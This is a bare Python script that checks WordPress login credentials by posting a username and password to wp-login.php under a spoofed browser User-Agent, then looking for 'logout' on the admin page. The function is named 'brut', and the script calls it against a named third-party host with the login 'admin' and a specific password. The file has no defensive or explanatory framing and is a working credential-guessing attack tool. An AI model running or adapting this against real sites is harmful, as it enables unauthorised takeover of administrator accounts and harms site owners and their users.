import requests
 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'DNT': '1'
}

def brut(host, login, pwd):
    payload = {
        'log':login,
        'pwd':pwd,
        #'wp-submit': 'Log+In',
        #'rememberme': 'forever',
        'redirect_to': 'https://'+host+'/wp-admin',
        'testcookie': '1'
    }
    url = 'http://'+host+'/wp-login.php'
    s = requests.Session()
    try:    
        s.post(url, data=payload, headers=headers)
    except Exception:
        print('ERROR')
        return False
    response = s.get('http://'+host+'/wp-admin', headers=headers)
    if response.text.find('logout')>0:
        return True
    else:
        return False

result = brut('fumgor.myjino.ru','admin','198616')
if result:
    print('Good')
else:
    print('Bad')
